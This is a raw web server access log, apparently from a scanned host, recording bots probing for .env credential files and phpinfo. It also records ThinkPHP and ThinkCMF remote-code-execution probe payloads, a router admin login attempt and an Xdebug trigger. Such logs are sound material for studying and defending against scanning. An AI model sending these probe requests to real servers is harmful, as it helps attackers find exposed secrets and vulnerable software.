109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "GET /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:40 -0600] "POST /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "GET /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "POST /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "GET /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [16/Jan/2023:11:06:41 -0600] "POST /phpinfo HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:11:08:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
62.233.50.179 - - [16/Jan/2023:11:18:48 -0600] "\x03" 400 226 "-" "-"
185.254.196.223 - - [16/Jan/2023:11:26:22 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:11:26:23 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:11:27:28 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.95.25 - - [16/Jan/2023:11:35:40 -0600] "CONNECT cipicaoadminpanel.xyz:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
54.37.163.160 - - [16/Jan/2023:11:54:58 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.163.160 - - [16/Jan/2023:11:54:59 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [16/Jan/2023:11:57:38 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:12:09:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
178.128.83.89 - - [16/Jan/2023:12:19:19 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [16/Jan/2023:13:07:35 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:13:10:05 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.83.31.179 - - [16/Jan/2023:13:12:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.238.29.56 - - [16/Jan/2023:13:40:46 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
